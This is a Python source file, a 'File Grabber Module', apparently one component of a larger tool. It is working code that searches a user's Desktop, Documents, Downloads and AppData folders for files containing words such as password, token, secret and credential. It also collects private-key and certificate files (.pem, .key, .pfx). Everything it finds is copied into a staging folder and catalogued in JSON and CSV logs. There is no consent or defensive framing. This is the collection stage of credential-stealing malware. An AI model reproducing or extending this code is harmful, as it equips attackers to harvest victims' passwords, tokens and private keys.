"""
File Grabber Module (Optional)
Refactored from filegrabber.py for better integration
"""

import os
import shutil
import json
import csv
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional

try:
    from docx import Document              # python-docx
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False

try:
    from openpyxl import load_workbook
    XLSX_AVAILABLE = True
except ImportError:
    XLSX_AVAILABLE = False

try:
    from pdfminer.high_level import extract_text as pdf_extract_text
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

KEYWORDS = ["password", "secret", "token", "key", "api", "login", "credential"]
MAX_FILE_SIZE_MB = 100  # Limit file size to prevent huge files

TEXT_EXTS = {
    ".txt", ".log", ".csv", ".json", ".md", ".ini", ".cfg", ".conf",
    ".xml", ".yml", ".yaml", ".env", ".py", ".js", ".html", ".css"
}

def bytes_keyword_hits(path, keywords, chunk_size=1024 * 1024):
    """Search for keywords in binary files"""
    hits = []
    try:
        kw_bytes = [k.encode("utf-8").lower() for k in keywords]
        with open(path, "rb") as f:
            offset = 0
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                cl = chunk.lower()
                for kb in kw_bytes:
                    idx = cl.find(kb)
                    if idx != -1:
                        hits.append({"offset": int(offset + idx), "keyword": kb.decode("utf-8")})
                offset += len(chunk)
    except Exception:
        pass
    return hits

def text_keyword_matches(text, keywords):
    """Search for keywords in text with line numbers"""
    matches = []
    try:
        lines = text.splitlines()
        for i, line in enumerate(lines, 1):
            low = line.lower()
            for kw in keywords:
                if kw in low:
                    matches.append({"line_number": i, "keyword": kw, "line": line.strip()})
    except Exception:
        pass
    return matches

def read_text_file(path):
    """Read text file with multiple encoding attempts"""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        try:
            with open(path, "r", encoding="latin-1", errors="ignore") as f:
                return f.read()
        except Exception:
            return ""

def read_docx_text(path):
    """Extract text from DOCX file"""
    if not DOCX_AVAILABLE:
        return ""
    try:
        doc = Document(path)
        return "\n".join(p.text for p in doc.paragraphs)
    except Exception:
        return ""

def read_xlsx_text(path, max_rows_per_sheet=1000):
    """Extract text from XLSX file"""
    if not XLSX_AVAILABLE:
        return ""
    out = []
    try:
        wb = load_workbook(path, read_only=True, data_only=True)
        for sheet in wb.worksheets:
            rows = 0
            for row in sheet.iter_rows(values_only=True):
                rows += 1
                if rows > max_rows_per_sheet:
                    break
                vals = [str(c) for c in row if c is not None]
                if vals:
                    out.append(" ".join(vals))
    except Exception:
        return ""
    return "\n".join(out)

def read_pdf_text(path):
    """Extract text from PDF file"""
    if not PDF_AVAILABLE:
        return ""
    try:
        return pdf_extract_text(path) or ""
    except Exception:
        return ""

def extract_text_by_ext(path):
    """Extract text based on file extension"""
    ext = os.path.splitext(path)[1].lower()
    if ext == ".docx":
        return read_docx_text(path)
    if ext == ".xlsx":
        return read_xlsx_text(path)
    if ext == ".pdf":
        return read_pdf_text(path)
    if ext in TEXT_EXTS:
        return read_text_file(path)
    return None

def size_mb(path):
    """Get file size in MB"""
    try:
        return os.path.getsize(path) / (1024 * 1024)
    except Exception:
        return 0.0

def copy_preserving_tree(src_path, base_src, base_dst):
    """Copy file preserving directory structure"""
    rel_path = os.path.relpath(src_path, base_src)
    dst_path = os.path.join(base_dst, rel_path)
    os.makedirs(os.path.dirname(dst_path), exist_ok=True)
    try:
        shutil.copy2(src_path, dst_path)
        return dst_path, True, ""
    except Exception as e:
        return dst_path, False, str(e)

def scan_directory(scan_folder: str, output_dir: str, keywords: List[str] = None) -> Dict[str, Any]:
    """
    Scan directory for interesting files
    Returns statistics about the scan
    """
    if keywords is None:
        keywords = KEYWORDS
    
    if not os.path.isdir(scan_folder):
        raise ValueError("Provided path is not a directory.")

    output_folder = Path(output_dir)
    if output_folder.exists():
        shutil.rmtree(output_folder, ignore_errors=True)
    output_folder.mkdir(parents=True, exist_ok=True)

    log = []
    total_files = 0
    copied_files = 0
    files_with_matches = 0

    for root, dirs, files in os.walk(scan_folder):
        # Skip system directories
        dirs[:] = [d for d in dirs if not d.startswith('.') and d.lower() not in ['system32', 'windows', '$recycle.bin']]
        
        for name in files:
            total_files += 1
            fpath = os.path.join(root, name)

            # Skip if file is too large
            if size_mb(fpath) > MAX_FILE_SIZE_MB:
                log.append({
                    "original_path": fpath,
                    "copied": False,
                    "skip_reason": f"size>{MAX_FILE_SIZE_MB}MB",
                    "size_bytes": os.path.getsize(fpath) if os.path.exists(fpath) else 0,
                    "matches": [],
                    "binary_hits": [],
                    "extractor": None,
                })
                continue

            ext_text = extract_text_by_ext(fpath)
            matches = []
            binary_hits = []

            if ext_text is None:
                # Unknown/binary extension → do raw byte scan for keywords
                binary_hits = bytes_keyword_hits(fpath, [k.lower() for k in keywords])
            else:
                # We have text → search with line numbers
                matches = text_keyword_matches(ext_text, [k.lower() for k in keywords])

            # Only copy files that have matches or are interesting file types
            should_copy = bool(matches or binary_hits or any(fpath.lower().endswith(ext) for ext in ['.key', '.pem', '.p12', '.pfx', '.crt', '.cer']))

            dst = ""
            copied = False
            copy_error = ""
            
            if should_copy:
                dst, copied, copy_error = copy_preserving_tree(fpath, scan_folder, str(output_folder))
                if copied:
                    copied_files += 1
                if matches or binary_hits:
                    files_with_matches += 1

            entry = {
                "original_path": fpath,
                "copied_path": dst,
                "copied": copied,
                "copy_error": copy_error,
                "size_bytes": os.path.getsize(fpath) if os.path.exists(fpath) else None,
                "matches": matches,
                "binary_hits": binary_hits,
                "extractor": (
                    "docx" if fpath.lower().endswith(".docx") else
                    "xlsx" if fpath.lower().endswith(".xlsx") else
                    "pdf"  if fpath.lower().endswith(".pdf")  else
                    "text" if ext_text is not None and fpath.lower().split(".")[-1] in {e.strip(".") for e in TEXT_EXTS} else
                    None
                ),
            }
            
            if should_copy:  # Only log files we actually processed
                log.append(entry)

    # Create summary
    meta = {
        "scanned_root": os.path.abspath(scan_folder),
        "output_root": str(output_folder.absolute()),
        "total_files_seen": total_files,
        "files_copied": copied_files,
        "files_with_matches": files_with_matches,
        "keywords": keywords,
        "timestamp": datetime.utcnow().isoformat() + "Z",
    }
    
    # Save detailed log
    with open(output_folder / "scan_log.json", "w", encoding="utf-8") as f:
        json.dump({"meta": meta, "items": log}, f, ensure_ascii=False, indent=2)

    # Save CSV summary
    with open(output_folder / "scan_summary.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["Original Path", "Copied", "Copy Error", "Size Bytes", "Extractor", "Text Matches", "Binary Hits"])
        for it in log:
            text_hits_str = "; ".join(f"{m['keyword']}@{m.get('line_number','?')}" for m in it["matches"]) if it["matches"] else ""
            bin_hits_str = "; ".join(f"{h['keyword']}@{h['offset']}" for h in it["binary_hits"]) if it["binary_hits"] else ""
            w.writerow([
                it["original_path"],
                it["copied"],
                it["copy_error"],
                it["size_bytes"],
                it["extractor"],
                text_hits_str,
                bin_hits_str
            ])

    print(f"File grabber scan complete:")
    print(f"  Scanned: {total_files} files")
    print(f"  Copied: {copied_files} files")
    print(f"  Files with keyword matches: {files_with_matches}")
    print(f"  Output: {output_folder}")
    
    return meta

def grab_files_from_common_locations(output_dir: str) -> bool:
    """
    Scan common locations for interesting files
    This is a safer alternative to asking user for input
    """
    common_locations = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expandvars("%APPDATA%"),
        os.path.expandvars("%LOCALAPPDATA%"),
    ]
    
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    total_stats = {
        "total_files_seen": 0,
        "files_copied": 0,
        "files_with_matches": 0,
        "locations_scanned": []
    }
    
    for location in common_locations:
        if os.path.exists(location) and os.path.isdir(location):
            try:
                location_name = os.path.basename(location) or "root"
                scan_output = output_path / f"grabbed_{location_name}"
                
                print(f"Scanning {location}...")
                stats = scan_directory(location, str(scan_output))
                
                total_stats["total_files_seen"] += stats["total_files_seen"]
                total_stats["files_copied"] += stats["files_copied"]
                total_stats["files_with_matches"] += stats["files_with_matches"]
                total_stats["locations_scanned"].append({
                    "location": location,
                    "stats": stats
                })
                
            except Exception as e:
                print(f"Error scanning {location}: {e}")
                continue
    
    # Save overall summary
    with open(output_path / "file_grabber_summary.json", "w", encoding="utf-8") as f:
        json.dump(total_stats, f, ensure_ascii=False, indent=2)
    
    print(f"\nFile grabber completed:")
    print(f"  Total files scanned: {total_stats['total_files_seen']}")
    print(f"  Total files copied: {total_stats['files_copied']}")
    print(f"  Files with matches: {total_stats['files_with_matches']}")
    
    return True
